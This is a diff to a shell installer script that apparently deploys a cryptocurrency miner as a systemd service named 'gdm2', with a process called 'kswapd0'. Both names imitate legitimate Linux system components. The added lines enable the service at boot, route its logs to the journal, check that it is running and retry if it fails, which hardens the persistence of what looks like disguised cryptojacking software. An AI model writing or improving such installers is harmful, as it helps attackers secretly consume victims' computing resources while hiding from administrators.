@@ -220,6 +220,7 @@ if [ "$TOTAL_RAM" -lt 2048 ] || [ "$CURRENT_SWAP" -eq 0 ]; then
     echo "  sudo chmod 600 /swapfile"
     echo "  sudo mkswap /swapfile"
     echo "  sudo swapon /swapfile"
+    echo "  echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab"
     echo ""
     echo "Continuing installation with reduced CPU threads (50%)..."
     echo ""
@@ -485,6 +486,11 @@ OOMScoreAdjust=200
 MemoryMax=400M
 MemoryHigh=300M
 
+# Enable logging for debugging
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=gdm2
+
 [Install]
 WantedBy=multi-user.target
 EOL
@@ -493,10 +499,41 @@ EOL
     echo "[*] Ensuring old processes are stopped before starting new service..."
     force_stop_service "gdm2" "kswapd0"
     
-    echo "[*] Starting gdm2 systemd service"
+    echo "[*] Reloading systemd daemon..."
     sudo systemctl daemon-reload
+    
+    echo "[*] Enabling gdm2 service for auto-start..."
     sudo systemctl enable gdm2.service
+    
+    echo "[*] Starting gdm2 service NOW..."
     sudo systemctl start gdm2.service
+    
+    # Wait for service to start
+    sleep 3
+    
+    # Verify service is running
+    echo "[*] Verifying service status..."
+    if sudo systemctl is-active --quiet gdm2.service; then
+        echo "[✓] Service is RUNNING!"
+        sudo systemctl status gdm2.service --no-pager -l | head -15
+    else
+        echo "[!] WARNING: Service is NOT running!"
+        echo "[!] Checking logs..."
+        sudo journalctl -u gdm2 -n 20 --no-pager
+        echo ""
+        echo "[!] Trying to start again..."
+        sudo systemctl start gdm2.service
+        sleep 2
+        if sudo systemctl is-active --quiet gdm2.service; then
+            echo "[✓] Service started on second attempt!"
+        else
+            echo "[!] Service failed to start - check logs with:"
+            echo "    sudo journalctl -u gdm2 -f"
+            echo "    sudo systemctl status gdm2"
+        fi
+    fi
+    
+    echo ""
     echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
   fi
 fi
